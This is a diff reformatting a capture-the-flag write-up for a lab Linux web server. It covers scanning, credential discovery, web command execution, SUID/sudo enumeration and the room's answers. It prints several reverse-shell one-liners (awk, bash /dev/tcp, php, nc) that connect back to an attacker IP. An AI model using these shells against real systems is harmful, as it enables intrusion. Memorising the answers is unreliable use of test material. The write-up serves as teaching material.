@@ -1,22 +1,21 @@
-IP Address = 10.10.12.75
+``IP Address = 10.10.12.75``
 
-Nmap Scan Result
-----------------
-Open Ports:
-===========
+# Nmap Scan Result
+
+## Open Ports:
+
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-=================================================================================
 
-Operating System: Ubuntu
-========================
+### Operating System: Ubuntu
 
-Command: nmap -sTV -O -sC {IP Address}
---------------------------------------
 
-Nikto Scan
-----------
---
+Command: `nmap -sTV -O -sC {IP Address}`
+
+
+### Nikto Scan
+
+```
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          10.10.12.75
@@ -38,72 +37,55 @@ Nikto Scan
 + 7889 requests: 0 error(s) and 9 item(s) reported on remote host
 + End Time:           2021-05-02 02:31:46 (GMT-4) (3267 seconds)
 ------------------------------------------------------------------
---
+```
 
-Command: nikto -host http://{IP Address}
-
--------------------------------------
-
-Target WebServer Enumeration
-
-## Main page of the website have comment on its source code that is 
-
-Username: R1ckRul3s
-
-## that looks usefull
-
-## target website page or subdirectry robots.txt have rendom string that is
-
-Wubbalubbadubdub
-
-## This is suspiciouse 
-
------------------------
-
-Directry Scanning 
-
-/assets
-## this have some Common Thing use in website nothing more
-robots.txt
+Command Syntax: `nikto -host http://{IP Address}`
 
 
---------
-As nikto finds login.php so go for it.They required username and password we found username and some rendom string try for it 
+## Target WebServer Enumeration
 
-## It works and they provide some command execution portal and this is vulnerable and good for us
+Main page of the website have comment on its source code that is 
 
+Username: `R1ckRul3s`
 
-----
-## use ls and there is first ingreden Sup3rS3cretPickl3Ingred.txt use cat to view the content of the file 
-## looks they use some filters for command so how we see the content of the file.There are some other command also like 'more,head,tail,less' use it find which will works
+that looks usefull. target website page or subdirectry robots.txt have rendom string that is`Wubbalubbadubdub`This is Suspicious  
 
-## now time for getting reverse shell for furthure Post Exploitation
+## Directry Scanning 
 
------
+**/assets**
+this have some Common Thing use in website nothing more
+**robots.txt**
 
-Getting reverse shell 
+As nikto finds `login.php` so go for it.They required username and password we found username and some rendom string try for it 
+
+It works and they provide some command execution portal and this is vulnerable and good for us
+
+Use ls and there is first ingreden `Sup3rS3cretPickl3Ingred.txt` use cat to view the content of the file. looks they use some filters for command so how we see the content of the file. There are some other command also like `more`,`head`,`tail`,`less` use it find which will works
+
+There is not need for getting rev-shell but i can try to get reverse shell for furthure Post Exploitation
+
+## Getting reverse shell 
 
 start a lisener on your machine with netcat and pawncat which you use
 
-## unfortunativly i can't get the reverse shell and 
+unfortunativly i can't get the reverse shell and 
 
 but by checking the source code of the portal.php file i found some base64 encode string 
 
 by decoding it this is "rabithole"
 
+After try alot of reverse shell code i get connetion with this reverse shell code
 
-## After try alot of reverse shell i get connetion with this reverse shell code
---
-awk 'BEGIN {s = "/inet/tcp/0/10.8.186.33/9001"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
---
-now we can try to fing other ingredent and they are in /home/rick directry its name is second ingredients
-## Note: they have spaces in there name so use the quotes in the command for see this file like the following command
+``awk 'BEGIN {s = "/inet/tcp/0/10.8.186.33/9001"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null``
 
-less /home/rick/"second ingredients"
+now we can try to find other ingredent and they are in /home/rick directry its name is second ingredients
+**Note: they have spaces in there name so use the quotes in the command for see this file like the following command**
 
-## This give me reveseshell but this only replicat the webshell in your terminal this is not normal shell and there you use all commands that are terminate like cat,more,head. i try to gain proper reverse shell which the following code but i cant. php and netcat number 4 shell work but that not work properly
+``less /home/rick/"second ingredients"``
 
--------
+This give me reveseshell but this only replicat the webshell in your terminal this is not normal shell and there you use all commands that are terminate like cat,more,head. i try to gain proper reverse shell which the following code but i cant. php and netcat number 4 shell work but that are not that usefull.
+
+```
 1) bash -i >& /dev/tcp/10.8.186.33/5555 0>&1
 
 2) php -r '$sock=fsockopen("10.8.186.33",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -111,14 +93,14 @@ less /home/rick/"second ingredients"
 3) nc -e /bin/sh 10.8.186.33 5555
 
 4) rm -f /tmp/p; mknod /tmp/p p && nc 10.8.186.33 5555 0/tmp/p
---------
+```
 
-## So, now i using the web shell for finding the ingredent so first i use the following command for suid 
+So, now i using the web shell for finding the ingredent so first i use the following command for suid 
 
-fing / -perm /4000 2>/dev/null
+``fing / -perm /4000 2>/dev/null``
 
 They show me the following result 
---
+```
 /snap/core/5742/bin/mount
 /snap/core/5742/bin/ping
 /snap/core/5742/bin/ping6
@@ -172,24 +154,21 @@ They show me the following result
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/policykit-1/polkit-agent-helper-1
 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
---
+```
 
-There i see sudo have suid bit on by usig this i can see the root folder igredent with the following command 
+There i see sudo have suid bit on by using this i can see the root folder igredent. first see what is the name of the file of third igredent using 
 
-first see what is the name of the file of third igredent using 
+``/usr/bin/sudo ls -al /root``
 
-/usr/bin/sudo ls -al /root
-##
-Using this i come to know the file name is 3rd.txt so just using the following command and i see the ingredent
+Using this i come to know the file name is `3rd.txt` so just using the following command and i see the ingredent
 
-##
-/usr/bin/sudo less /root/3rd.txt
+`/usr/bin/sudo less /root/3rd.txt`
 
 
 
 
-## Here we fing all the ingredent 
-
+Here we find all the ingredent 
+```
 Q1:What is the first ingredient Rick needs?
 A: mr. meeseek hair
 
@@ -198,3 +177,4 @@ A:1 jerry tear
 
 Q4:Whats the final ingredient Rick needs?
 A:fleeb juice
+```
